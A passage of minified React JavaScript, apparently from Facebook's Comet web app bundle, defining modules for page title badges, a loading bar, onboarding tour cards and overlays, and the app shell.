      "CometRouterMetaManager",
      "cr:701",
      "react",
      "useBlinkingTitleMessage",
      "useCometMetaManagerBadgeCount",
      "useCometMetaManagerSubscriptions",
      "useIsCurrentRouteMediaViewer",
      "usePrevious",
    ],
    function (a, b, c, d, e, f, g, h) {
      "use strict";
      var i,
        j = i || (i = d("react")),
        k = i.useLayoutEffect,
        l = "Facebook",
        m = 20;
      function a() {
        var a = c("useIsCurrentRouteMediaViewer")(),
          d = c("usePrevious")(a);
        c("useCometMetaManagerSubscriptions")();
        k(
          function () {
            var b = d !== a;
            if (!b) return;
            (b = document.documentElement) == null
              ? void 0
              : (b = b.classList) == null
              ? void 0
              : b.toggle("_9t1d", a);
          },
          [a, d]
        );
        var e = c("useCometMetaManagerBadgeCount")(),
          f = e.messengerBadgeCount;
        e = e.notificationsBadgeCount;
        return j.jsx(c("CometRouterMetaManager"), {
          appTitle: l,
          badgeConfig: { badgeCount: f + e, badgeCountLimit: m },
          blinkingTitle: c("useBlinkingTitleMessage")(),
          shouldBadgeFavicon: b("cr:701")(f),
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometRouterLoadingContextInternals_DO_NOT_USE",
    ["emptyFunction", "react", "recoverableViolation"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h;
      a = h || d("react");
      b = a.createContext(function (a) {
        c("recoverableViolation")(
          "CometRouterLoadingContextInternals is not set",
          "comet_infra"
        );
        return c("emptyFunction");
      });
      g["default"] = b;
    },
    98
  );
  __d(
    "useCometRouterLoadingState",
    ["CometRouterLoadingContextInternals_DO_NOT_USE", "react"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h;
      b = h || d("react");
      var i = b.useContext,
        j = b.useEffect,
        k = b.useState;
      function a() {
        var a = i(c("CometRouterLoadingContextInternals_DO_NOT_USE")),
          b = k(!1),
          d = b[0],
          e = b[1];
        j(
          function () {
            var b = a(function (a) {
              e(a.loading);
            });
            return function () {
              b();
            };
          },
          [a]
        );
        return d;
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "CometPageTransitioning.react",
    ["ariaGlimmerProps", "react", "stylex", "useCometRouterLoadingState"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i,
        j = i || d("react"),
        k = {
          displayNone: { display: "x1s85apg", $$css: !0 },
          loadingBackground: {
            animationDelay: "xshklg3",
            animationDuration: "xxkxylk",
            animationFillMode: "x1u6ievf",
            animationName: "x127lhb5",
            animationTimingFunction: "xa3vuyk",
            backgroundColor: "x1xzmf5g",
            height: "xqu0tyb",
            end: "xds687c",
            left: null,
            right: null,
            start: "x17qophe",
            opacity: "xg01cxk",
            position: "xixxii4",
            top: "x13vifvy",
            width: "xn9wirt",
            zIndex: "x14g40p9",
            $$css: !0,
          },
          loadingForeground: {
            animationDuration: "x1c74tu6",
            animationIterationCount: "xa4qsjk",
            animationName: "x14rlmvs",
            animationTimingFunction: "xa3vuyk",
            backgroundColor: "x4o00kh",
            height: "x5yr21d",
            width: "xh8yej3",
            $$css: !0,
          },
        },
        l = "always-enable-animations";
      function a() {
        var a = c("useCometRouterLoadingState")();
        return j.jsx(
          "div",
          babelHelpers["extends"]({}, c("ariaGlimmerProps"), {
            className: [
              l,
              (h || (h = c("stylex")))(
                k.loadingBackground,
                a !== !0 && k.displayNone
              ),
            ].join(" "),
            children: j.jsx("div", {
              className:
                "x1c74tu6 xa4qsjk x14rlmvs xa3vuyk x4o00kh x5yr21d xh8yej3",
            }),
          })
        );
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometAppContent.react",
    [
      "CometAppMainContentAreaRenderer.react",
      "CometAppViewStack.react",
      "CometBackupPlaceholder.react",
      "CometMetaManager.react",
      "CometPageTransitioning.react",
      "CometPlaceholder.react",
      "CometSSRMultipassBoundary.react",
      "react",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || d("react");
      function a(a) {
        var b = a.appFooter,
          d = a.appNavigation,
          e = a.disableNegativeMarginBottom;
        a = a.shouldRenderTopNav;
        a = a === void 0 ? !0 : a;
        return i.jsxs(i.Fragment, {
          children: [
            i.jsx(c("CometMetaManager.react"), {}),
            i.jsx(c("CometPageTransitioning.react"), {}),
            i.jsx(c("CometAppViewStack.react"), {
              baseView: i.jsxs(c("CometPlaceholder.react"), {
                fallback: null,
                children: [
                  i.jsx(c("CometBackupPlaceholder.react"), {
                    fallback: null,
                    children: i.jsx(c("CometSSRMultipassBoundary.react"), {
                      id: "top_nav",
                      children: a && d,
                    }),
                  }),
                  i.jsx(c("CometAppMainContentAreaRenderer.react"), {
                    disableNegativeMarginBottom: e,
                    shouldRenderTopNav: a,
                  }),
                  b,
                ],
              }),
            }),
          ],
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometNUXManager.react",
    ["CometNUXManagerContext", "emptyFunction", "react", "useStable"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || (h = d("react"));
      b = h;
      var j = b.useCallback,
        k = b.useMemo,
        l = b.useRef;
      function a(a) {
        var b = a.children,
          d = a.disableAuction,
          e = l(null),
          f = c("useStable")(function () {
            return new Set();
          }),
          g = c("useStable")(function () {
            return new Map();
          }),
          h = j(
            function (a, b, h) {
              var i;
              h === void 0 && (h = !1);
              if ((!h && g.has(a)) || f.has(a)) return c("emptyFunction");
              g.has(a) || g.set(a, []);
              (i = g.get(a)) == null ? void 0 : i.push(b);
              (d === !0 || e.current == null || (h && a === e.current)) &&
                ((e.current = a), b(!0));
              return function () {
                var c;
                e.current === a && (e.current = null);
                g.set(
                  a,
                  (c =
                    (c = g.get(a)) == null
                      ? void 0
                      : c.filter(function (a) {
                          return a !== b;
                        })) != null
                    ? c
                    : []
                );
                ((c = g.get(a)) == null ? void 0 : c.length) === 0 &&
                  g["delete"](a);
              };
            },
            [g, f, d]
          ),
          m = j(
            function (a) {
              f.add(a);
              var b = g.get(a);
              b != null &&
                b.forEach(function (a) {
                  return a(!1);
                });
              e.current === a && (e.current = null);
            },
            [f, g]
          );
        a = k(
          function () {
            return { registerNUX: h, removeNUX: m };
          },
          [m, h]
        );
        return i.jsx(c("CometNUXManagerContext").Provider, {
          value: a,
          children: b,
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometNUXTourContext",
    ["react"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h;
      a = h || d("react");
      b = a.createContext(null);
      g["default"] = b;
    },
    98
  );
  __d(
    "CometNUXTourCardFooter.react",
    [
      "CometProgressStepper.react",
      "CometRow.react",
      "CometRowItem.react",
      "TetraButtonGroup.react",
      "react",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || d("react"),
        j = "center";
      function a(a) {
        var b = a.primaryButton,
          d = a.secondaryButton,
          e = a.tourIndex;
        a = a.tourLength;
        return i.jsxs(c("CometRow.react"), {
          align: "center",
          columns: 2,
          paddingHorizontal: 0,
          paddingTop: 0,
          spacingHorizontal: 32,
          verticalAlign: j,
          children: [
            i.jsx(c("CometRowItem.react"), {
              expanding: !0,
              verticalAlign: j,
              children:
                a > 1
                  ? i.jsx(c("CometProgressStepper.react"), {
                      step: e + 1,
                      totalSteps: a,
                      type: "spaced-out",
                    })
                  : null,
            }),
            i.jsx(c("CometRowItem.react"), {
              verticalAlign: j,
              children: i.jsx(c("TetraButtonGroup.react"), {
                align: "end",
                direction: "backward",
                paddingHorizontal: 0,
                paddingTop: 0,
                primary: b,
                secondary: d,
                size: "medium",
                verticalAlign: j,
              }),
            }),
          ],
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometNUXTourInlineSurvey.react",
    ["CometNUXInlineSurvey.react", "CometNUXTourContext", "react"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || (h = d("react"));
      b = h;
      var j = b.useContext,
        k = b.useMemo;
      function a(a) {
        var b = a.target;
        a = b.storageRef.current.hasAnsweredSurvey;
        var d = j(c("CometNUXTourContext")),
          e = k(
            function () {
              function a() {
                b.storageRef.current.hasAnsweredSurvey = !0;
              }
              return {
                onHelpful: function () {
                  a(),
                    d == null
                      ? void 0
                      : d.onHelpful == null
                      ? void 0
                      : d.onHelpful(b.key);
                },
                onNotHelpful: function () {
                  a(),
                    d == null
                      ? void 0
                      : d.onNotHelpful == null
                      ? void 0
                      : d.onNotHelpful(b.key);
                },
              };
            },
            [b, d]
          ),
          f = e.onHelpful;
        e = e.onNotHelpful;
        return i.jsx(c("CometNUXInlineSurvey.react"), {
          initialHasAnsweredSurvey: a,
          onHelpful: f,
          onNotHelpful: e,
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometNUXTourCard.react",
    [
      "fbt",
      "ix",
      "CometBackgroundImage.react",
      "CometColumn.react",
      "CometColumnItem.react",
      "CometNUXTourCardFooter.react",
      "CometNUXTourContext",
      "CometNUXTourInlineSurvey.react",
      "CometPopover.react",
      "Random",
      "TetraIcon.react",
      "TetraTextPairing.react",
      "fbicon",
      "react",
      "stylex",
      "unrecoverableViolation",
    ],
    function (a, b, c, d, e, f, g, h, i) {
      "use strict";
      var j,
        k,
        l = k || (k = d("react"));
      b = k;
      var m = b.useContext,
        n = b.useRef,
        o = 16,
        p = {
          container: {
            maxWidth: "x1j9u4d2",
            minWidth: "x13o0s5z",
            position: "x1n2onr6",
            $$css: !0,
          },
          headerStyle: { marginTop: "xcxhlts", $$css: !0 },
        },
        q = {
          above: { marginBottom: "x1e56ztr", $$css: !0 },
          below: { marginTop: "x1xmf6yo", $$css: !0 },
          end: {
            marginStart: "x1i64zmx",
            marginLeft: null,
            marginRight: null,
            $$css: !0,
          },
          start: {
            marginEnd: "x1emribx",
            marginLeft: null,
            marginRight: null,
            $$css: !0,
          },
        };
      function a(a) {
        var b = a.inlineSurveySampleRate,
          e = a.primaryButton,
          f = a.secondaryButton,
          g = a.target,
          k = a.tour,
          r = a.tourIndex,
          s = a.tourLength;
        a = a.withArrow;
        var t = n(
            (function () {
              var a;
              if (
                ((a = k.callbacks) == null ? void 0 : a.onHelpful) == null ||
                ((a = k.callbacks) == null ? void 0 : a.onNotHelpful) == null
              )
                return !1;
              if (g == null || g.storageRef.current.hasAnsweredSurvey === !0)
                return !1;
              if (g.storageRef.current.inlineSurveyCoinflipResult == null) {
                a = d("Random").coinflip(b);
                g.storageRef.current.inlineSurveyCoinflipResult = a;
              }
              return g.storageRef.current.inlineSurveyCoinflipResult;
            })()
          ).current,
          u = m(c("CometNUXTourContext")),
          v = g.contextualLayerOptions,
          w = g.description,
          x = g.title;
        if (u == null)
          throw c("unrecoverableViolation")(
            "No provider in nux tour card",
            "comet_ui"
          );
        v = (v = v.position) != null ? v : "below";
        v = q[v];
        return l.jsx("div", {
          className: (j || (j = c("stylex")))(p.container, !a && v),
          children: l.jsxs(c("CometPopover.react"), {
            withArrow: a,
            children: [
              g.image != null
                ? l.jsx(
                    c("CometBackgroundImage.react"),
                    babelHelpers["extends"]({}, g.image)
                  )
                : null,
              l.jsxs(c("CometColumn.react"), {
                paddingHorizontal: 16,
                paddingTop: o,
                paddingVertical: 12,
                spacing: 20,
                children: [
                  l.jsx(c("CometColumnItem.react"), {
                    xstyle: p.headerStyle,
                    children: l.jsx(c("TetraTextPairing.react"), {
                      body: w,
                      headline: x,
                      headlineAddOn: l.jsx(c("TetraIcon.react"), {
                        "aria-label": h._("__JHASH__tnRfHlva-bL__JHASH__"),
                        icon: d("fbicon")._(i("478232"), 16),
                        onPress: function () {
                          u.endTour();
                        },
                        size: 16,
                        testid: void 0,
                      }),
                      level: 2,
                    }),
                  }),
                  t !== !0
                    ? null
                    : l.jsx(c("CometColumnItem.react"), {
                        paddingTop: 12,
                        children: l.jsx(c("CometNUXTourInlineSurvey.react"), {
                          target: g,
                        }),
                      }),
                  l.jsx(c("CometColumnItem.react"), {
                    verticalAlign: "center",
                    children: l.jsx(c("CometNUXTourCardFooter.react"), {
                      primaryButton: e,
                      secondaryButton: f,
                      tourIndex: r,
                      tourLength: s,
                    }),
                  }),
                ],
              }),
            ],
          }),
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometNuxTourHighlight.react",
    ["CometPulseEffectBase.react", "CometVisualCompletionAttributes", "react"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || (h = d("react"));
      b = h;
      var j = b.useMemo,
        k = b.useRef;
      function l(a) {
        var b = a.outerElementRef;
        a = a.target;
        var d = a.contextRef,
          e = a.isTargetFixed,
          f = d == null ? void 0 : d.current,
          g = b.current;
        a = j(
          function () {
            return e ? p(f) : q(f, g);
          },
          [f, e, g]
        );
        var h = j(
          function () {
            return m(f);
          },
          [f]
        );
        d = j(
          function () {
            return n(h);
          },
          [h]
        );
        return i.jsx("div", {
          style: (b = a) != null ? b : { display: "none" },
          children: i.jsx(c("CometPulseEffectBase.react"), {
            height: h.height,
            radii: h.radii,
            width: h.width,
            children: i.jsx("div", { style: d }),
          }),
        });
      }
      l.displayName = l.name + " [from " + f.id + "]";
      function a(a) {
        var b = k(null);
        return i.jsx(
          "div",
          babelHelpers["extends"](
            { className: "x1n2onr6 xoegz02", ref: b },
            c("CometVisualCompletionAttributes").IGNORE_DYNAMIC,
            {
              children: i.jsx(
                l,
                babelHelpers["extends"]({}, a, { outerElementRef: b })
              ),
            }
          )
        );
      }
      a.displayName = a.name + " [from " + f.id + "]";
      function m(a) {
        if (a == null) return { height: null, radii: null, width: null };
        var b = window.getComputedStyle(a),
          c = b.borderBottomLeftRadius,
          d = b.borderBottomRightRadius,
          e = b.borderTopLeftRadius;
        b = b.borderTopRightRadius;
        return {
          height: a.offsetHeight,
          radii: {
            borderBottomLeftRadius: c,
            borderBottomRightRadius: d,
            borderTopLeftRadius: e,
            borderTopRightRadius: b,
          },
          width: a.offsetWidth,
        };
      }
      function n(a) {
        var b = a.height,
          c = a.radii;
        a = a.width;
        if (b == null || c == null || a == null)
          return {
            borderBottomLeftRadius: "",
            borderBottomRightRadius: "",
            borderTopLeftRadius: "",
            borderTopRightRadius: "",
            height: "",
            width: "",
          };
        var d = {
          borderBottomLeftRadius: "",
          borderBottomRightRadius: "",
          borderTopLeftRadius: "",
          borderTopRightRadius: "",
          height: b + "px",
          width: a + "px",
        };
        Object.keys(c).forEach(function (a) {
          var b = c[a];
          b != null && (d[a] = b + "px");
        });
        return d;
      }
      function o(a, b) {
        return (
          Number.isNaN(b) ||
          Number.isNaN(a) ||
          !Number.isFinite(b) ||
          !Number.isFinite(a)
        );
      }
      function p(a) {
        if (a == null) return null;
        a = a.getBoundingClientRect();
        var b = a.top;
        a = a.left;
        return o(a, b)
          ? null
          : { left: a + "px", position: "fixed", top: b + "px" };
      }
      function q(a, b) {
        if (a == null || b == null) return null;
        var c = a.offsetParent;
        if (c == null) return null;
        c = c.getBoundingClientRect();
        b = b.getBoundingClientRect();
        var d = b.top - c.top;
        b = b.left - c.left;
        c = a.offsetTop - d;
        d = a.offsetLeft - b;
        return o(d, c)
          ? null
          : { left: d + "px", position: "absolute", top: c + "px" };
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "CometNUXTourOverlay.react",
    [
      "fbt",
      "BaseContextualLayer.react",
      "BaseContextualLayerAnchorRootContext",
      "BaseThemeProvider.react",
      "CometLayerKeyCommandWrapper.react",
      "CometNUXTourCard.react",
      "CometNuxTourHighlight.react",
      "CometVisualCompletionAttributes",
      "FocusRegion.react",
      "focusScopeQueries",
      "getComputedStyle",
      "react",
      "scrollIntoView",
      "stylex",
      "useSetAttributeRef",
    ],
    function (a, b, c, d, e, f, g, h) {
      "use strict";
      var i,
        j,
        k,
        l = k || (k = d("react"));
      e = k;
      var m = e.useCallback,
        n = e.useEffect,
        o = e.useId,
        p = e.useLayoutEffect,
        q = e.useState;
      function r(a, b) {
        if (a.endsWith("px")) return parseInt(a, 10);
        return a.endsWith("%") ? (parseInt(a, 10) * b) / 100 : 0;
      }
      function b(b) {
        var e = b.inlineSurveySampleRate,
          f = b.onNext,
          g = b.onPrev,
          k = b.target,
          s = b.themeConfig,
          t = b.tour;
        b = b.tourIndex;
        var u = o(),
          v = c("useSetAttributeRef")("id", u),
          w = "url(#" + u + ")",
          x = c("useSetAttributeRef")("mask", w),
          y = q(function () {
            if (a.innerWidth != null && a.innerHeight != null)
              return [a.innerWidth, a.innerHeight];
            else return [100, 100];
          }),
          z = y[0],
          A = y[1];
        y = q(null);
        var B = y[0],
          C = y[1],
          D = m(
            function () {
              A([a.innerWidth, a.innerHeight]);
              var b = k ? k.contextRef.current : null;
              if (b != null) {
                var d = b.getBoundingClientRect(),
                  e = d.height,
                  f = d.left,
                  g = d.top;
                d = d.width;
                b = (b = (i || (i = c("getComputedStyle")))(b)) != null ? b : {};
                var h = b.borderBottomLeftRadius,
                  j = b.borderBottomRightRadius,
                  l = b.borderRadius,
                  m = b.borderTopLeftRadius;
                b = b.borderTopRightRadius;
                C({
                  borderRadius: {
                    bottomLeft: (h = (h = h) != null ? h : l) != null ? h : "0px",
                    bottomRight:
                      (j = (h = j) != null ? h : l) != null ? j : "0px",
                    topLeft: (j = (h = m) != null ? h : l) != null ? j : "0px",
                    topRight: (h = (m = b) != null ? m : l) != null ? h : "0px",
                  },
                  height: e,
                  left: f,
                  top: g,
                  width: d,
                });
              }
            },
            [k]
          );
        n(
          function () {
            var a = { capture: !0, passive: !0 };
            window.addEventListener("scroll", D, a);
            window.addEventListener("resize", D, a);
            return function () {
              window.removeEventListener("scroll", D, a),
                window.removeEventListener("resize", D, a);
            };
          },
          [D]
        );
        p(
          function () {
            if ((k == null ? void 0 : k.contextRef.current) == null) return;
            c("scrollIntoView")(k.contextRef.current, {
              behavior: "smooth",
              verticalAlign: "center",
            });
            D();
          },
          [D, k]
        );
        y = b === 0;
        var E = b >= t.targets.length - 1,
          F =
            B != null &&
            B.borderRadius.topLeft === B.borderRadius.topRight &&
            B.borderRadius.topLeft === B.borderRadius.bottomLeft &&
            B.borderRadius.topLeft === B.borderRadius.bottomRight,
          G =
            k &&
            l.jsx(
              c("CometNUXTourCard.react"),
              {
                inlineSurveySampleRate: e,
                primaryButton: {
                  label: E
                    ? h._("__JHASH__RY8ihB-AncI__JHASH__")
                    : h._("__JHASH__vVNuK-7xkTl__JHASH__"),
                  onPress: f,
                  padding: "wide",
                  testid: "nux-tour-primary-button",
                },
                secondaryButton: y
                  ? null
                  : {
                      label: h._("__JHASH__sqTeJmgA5ut__JHASH__"),
                      onPress: g,
                      reduceEmphasis: !0,
                      testid: "nux-tour-secondary-button",
                    },
                target: k,
                tour: t,
                tourIndex: b,
                tourLength: t.targets.length,
                withArrow: k.withArrow,
              },
              k.key
            );
        E =
          k != null
            ? l.jsx(
                c("BaseContextualLayer.react"),
                babelHelpers["extends"](
                  { contextRef: k.contextRef },
                  (e = k.contextualLayerOptions) != null ? e : {},
                  {
                    children:
                      s != null
                        ? l.jsx(c("BaseThemeProvider.react"), {
                            config: s,
                            children: function (a, b) {
                              return l.jsx("div", {
                                className: (j || (j = c("stylex")))(a),
                                style: b,
                                children: G,
                              });
                            },
                          })
                        : G,
                  }
                )
              )
            : null;
        t.DISABLE_ANCHOR_ROOT_DO_NOT_USE !== !0 &&
          k != null &&
          (E = l.jsx(c("BaseContextualLayerAnchorRootContext").Provider, {
            value: k.anchorRootRef,
            children: E,
          }));
        return l.jsxs("div", {
          className: "x1dr59a3 xixxii4 x17qophe x13vifvy xn9wirt xhtitgo",
          children: [
            l.jsxs(
              "svg",
              babelHelpers["extends"](
                { viewBox: [0, 0].concat(z).join(" ") },
                c("CometVisualCompletionAttributes").IGNORE,
                {
                  children: [
                    l.jsx("defs", {
                      children: l.jsxs("mask", {
                        id: u,
                        ref: v,
                        suppressHydrationWarning: !0,
                        children: [
                          l.jsx("rect", {
                            fill: "white",
                            height: "100%",
                            width: "100%",
                            x: "0",
                            y: "0",
                          }),
                          B != null &&
                            F &&
                            l.jsx("rect", {
                              fill: "black",
                              height: B.height,
                              rx: r(B.borderRadius.topLeft, B.width),
                              ry: r(B.borderRadius.topLeft, B.height),
                              width: B.width,
                              x: B.left,
                              y: B.top,
                            }),
                          B != null &&
                            !F &&
                            l.jsxs(l.Fragment, {
                              children: [
                                l.jsx("rect", {
                                  fill: "black",
                                  height: B.height * 0.75,
                                  rx: r(B.borderRadius.topLeft, B.width),
                                  ry: r(B.borderRadius.topLeft, B.height),
                                  width: B.width * 0.75,
                                  x: B.left,
                                  y: B.top,
                                }),
                                l.jsx("rect", {
                                  fill: "black",
                                  height: B.height * 0.75,
                                  rx: r(B.borderRadius.topRight, B.width),
                                  ry: r(B.borderRadius.topRight, B.height),
                                  width: B.width * 0.75,
                                  x: B.left + B.width * 0.25,
                                  y: B.top,
                                }),
                                l.jsx("rect", {
                                  fill: "black",
                                  height: B.height * 0.75,
                                  rx: r(B.borderRadius.bottomLeft, B.width),
                                  ry: r(B.borderRadius.bottomLeft, B.height),
                                  width: B.width * 0.75,
                                  x: B.left,
                                  y: B.top + B.height * 0.25,
                                }),
                                l.jsx("rect", {
                                  fill: "black",
                                  height: B.height * 0.75,
                                  rx: r(B.borderRadius.bottomRight, B.width),
                                  ry: r(B.borderRadius.bottomRight, B.height),
                                  width: B.width * 0.75,
                                  x: B.left + B.width * 0.25,
                                  y: B.top + B.height * 0.25,
                                }),
                              ],
                            }),
                        ],
                      }),
                    }),
                    l.jsx("rect", {
                      className: "x4xt3t0",
                      height: "100%",
                      mask: w,
                      ref: x,
                      suppressHydrationWarning: !0,
                      width: "100%",
                      x: "0",
                      y: "0",
                    }),
                  ],
                }
              )
            ),
            k && l.jsx(c("CometNuxTourHighlight.react"), { target: k }),
            l.jsx(d("FocusRegion.react").FocusRegion, {
              autoFocusQuery:
                d("focusScopeQueries").headerFirstTabbableSecondScopeQuery,
              autoRestoreFocus: !0,
              containFocusQuery: d("focusScopeQueries").tabbableScopeQuery,
              recoverFocusQuery:
                d("focusScopeQueries").headerFirstTabbableSecondScopeQuery,
              children: l.jsx(c("CometLayerKeyCommandWrapper.react"), {
                debugName: "nux tour layer",
                children: E,
              }),
            }),
          ],
        });
      }
      b.displayName = b.name + " [from " + f.id + "]";
      g["default"] = b;
    },
    98
  );
  __d(
    "useCometNUXTourManagerReducer",
    ["react", "recoverableViolation"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = (h || d("react")).useReducer,
        j = function (a, b) {
          switch (b.type) {
            case "next":
              if (a.tourIndex == null || a.tour == null) {
                c("recoverableViolation")(
                  "Active Target or Tour is null which should not be possible when advancing in a NUXTour",
                  "comet_ui"
                );
                return a;
              }
              return a.tourIndex >= a.tour.targets.length - 1
                ? { tour: null, tourIndex: null }
                : babelHelpers["extends"]({}, a, { tourIndex: a.tourIndex + 1 });
            case "prev":
              if (a.tourIndex == null || a.tour == null) {
                c("recoverableViolation")(
                  "Active Target or Tour is null which should not be possible when going to the previous step in a NUXTour",
                  "comet_ui"
                );
                return a;
              }
              if (a.tourIndex <= 0) {
                c("recoverableViolation")(
                  "Cannot go to the previous step when the tourIndex is 0",
                  "comet_ui"
                );
                return a;
              }
              return babelHelpers["extends"]({}, a, {
                tourIndex: a.tourIndex - 1,
              });
            case "start_tour":
              return a.tour != null
                ? a
                : { themeConfig: b.themeConfig, tour: b.tour, tourIndex: 0 };
            case "end_tour":
              return { tour: null, tourIndex: null };
          }
        },
        k = { tour: null, tourIndex: null };
      function a() {
        return i(j, k);
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "CometNUXTourManager.react",
    [
      "CometNUXTourConsumerContext",
      "CometNUXTourContext",
      "CometNUXTourInProgressConsumerContext",
      "CometNUXTourOverlay.react",
      "react",
      "useCometNUXTourManagerReducer",
      "usePrevious",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || (h = d("react"));
      b = h;
      var j = b.useCallback,
        k = b.useEffect,
        l = b.useMemo,
        m = b.useRef,
        n = b.useState,
        o = 100;
      function a(a) {
        var b = a.children;
        a = a.inlineSurveySampleRate;
        a = a === void 0 ? o : a;
        var d = m(new Map()),
          e = c("useCometNUXTourManagerReducer")(),
          f = e[0],
          g = f.themeConfig,
          h = f.tour,
          p = f.tourIndex,
          q = e[1],
          r = j(
            function () {
              return h != null && p != null ? d.current.get(h.targets[p]) : null;
            },
            [h, p]
          );
        f = n(r());
        var s = f[0],
          t = f[1],
          u = m(null);
        u.current !== (h == null ? void 0 : h.callbacks) &&
          (u.current = h == null ? void 0 : h.callbacks);
        var v = m(function () {
          var a;
          a = (a = u.current) == null ? void 0 : a.onClose;
          a == null ? void 0 : a();
          u.current = null;
        });
        e = l(
          function () {
            return {
              endTour: function () {
                q({ type: "end_tour" }), v.current();
              },
              registerTarget: function (a, b) {
                d.current.set(a, b), t(r());
              },
              startTour: function (a, b) {
                q({ themeConfig: b, tour: a, type: "start_tour" });
              },
              unregisterTarget: function (a) {
                d.current["delete"](a), t(r());
              },
            };
          },
          [q, r, d]
        );
        f = l(
          function () {
            return {
              endTour: function () {
                q({ type: "end_tour" }), v.current();
              },
              onHelpful: function () {
                var a;
                for (
                  var b = arguments.length, c = new Array(b), d = 0;
                  d < b;
                  d++
                )
                  c[d] = arguments[d];
                (a = u.current) == null
                  ? void 0
                  : a.onHelpful == null
                  ? void 0
                  : a.onHelpful.apply(a, c);
              },
              onNotHelpful: function () {
                var a;
                for (
                  var b = arguments.length, c = new Array(b), d = 0;
                  d < b;
                  d++
                )
                  c[d] = arguments[d];
                (a = u.current) == null
                  ? void 0
                  : a.onNotHelpful == null
                  ? void 0
                  : a.onNotHelpful.apply(a, c);
              },
            };
          },
          [q]
        );
        var w = c("usePrevious")(p);
        k(function () {
          s === void 0 && v.current();
        });
        k(
          function () {
            var a = r();
            if (p != null && p !== w && (a == null ? void 0 : a.key) != null) {
              var b;
              (b = u.current) == null
                ? void 0
                : b.onStepVisible == null
                ? void 0
                : b.onStepVisible(a == null ? void 0 : a.key, p);
            }
          },
          [r, w, p]
        );
        var x = j(
            function () {
              q({ type: "next" });
            },
            [q]
          ),
          y = j(
            function () {
              q({ type: "prev" });
            },
            [q]
          );
        a =
          h != null && p != null && s !== void 0
            ? i.jsx(c("CometNUXTourOverlay.react"), {
                inlineSurveySampleRate: a,
                onNext: x,
                onPrev: y,
                target: s,
                themeConfig: g,
                tour: h,
                tourIndex: p,
              })
            : null;
        var z = a != null,
          A = c("usePrevious")(z);
        k(
          function () {
            if (z === !0 && A !== !0) {
              var a;
              a = (a = u.current) == null ? void 0 : a.onOpen;
              a == null ? void 0 : a();
            } else z === !1 && A !== !1 && v.current();
          },
          [A, z]
        );
        return i.jsxs(i.Fragment, {
          children: [
            i.jsx(c("CometNUXTourConsumerContext").Provider, {
              value: e,
              children: i.jsx(
                c("CometNUXTourInProgressConsumerContext").Provider,
                { value: z, children: b }
              ),
            }),
            a == null
              ? null
              : i.jsx(c("CometNUXTourContext").Provider, {
                  value: f,
                  children: a,
                }),
          ],
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometAppShell.react",
    [
      "BaseToasterStateManagerProvider.react",
      "CometCalloutManager.react",
      "CometNUXManager.react",
      "CometNUXTourManager.react",
      "VideoPlayerGlobalComponents.react",
      "cr:2099",
      "react",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || d("react");
      d =
        (e = b("cr:2099")) != null
          ? e
          : { DocumentTranslationStatusProvider: i.Fragment };
      var j = d.DocumentTranslationStatusProvider;
      function a(a) {
        var b = a.children;
        a = a.toaster;
        return i.jsx(j, {
          children: i.jsxs(c("BaseToasterStateManagerProvider.react"), {
            children: [
              i.jsx(c("CometCalloutManager.react"), {
                children: i.jsx(c("CometNUXTourManager.react"), {
                  children: i.jsx(c("CometNUXManager.react"), {
                    children: i.jsx(c("VideoPlayerGlobalComponents.react"), {
                      children: b,
                    }),
                  }),
                }),
              }),
              a,
            ],
          }),
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometLoggedInFacebookLogo.react",
    [
      "fbt",
      "CometIconLogo.react",
      "CometPressable.react",
      "XCometHomeControllerRouteBuilder",
      "react",
      "useTopNavigationLogging",
    ],
    function (a, b, c, d, e, f, g, h) {
      "use strict";
      var i,
        j = i || d("react"),
        k = c("XCometHomeControllerRouteBuilder").buildURL({});
      function a(a) {
        var b = a["aria-hidden"],
          e = a.withShadow;
        e = e === void 0 ? !1 : e;
        a = a.xstyle;
        var f = d("useTopNavigationLogging").useLogoLoggingCallbacks(),
          g = f[0];
        f = f[1];
        return j.jsx(c("CometPressable.react"), {
          "aria-hidden": b,
          "aria-label": h._("__JHASH__TlJCmSOrUbl__JHASH__"),
          expanding: !0,
          linkProps: {
            prefetchQueriesOnHover: !0,
            productAttribution: { tap_point: "logo" },
            traceParams: { navigation_source: "logo_click" },
            url: k,
          },
          onPress: g,
          overlayDisabled: !0,
          ref: f,
          testid: void 0,
          xstyle: a,
          children: j.jsx(c("CometIconLogo.react"), { shadow: e, size: 40 }),
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometSettingsBadge.react",
    [
      "CometBadge.react",
      "CometRelay",
      "CometSettingsBadgeQuery.graphql",
      "react",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i,
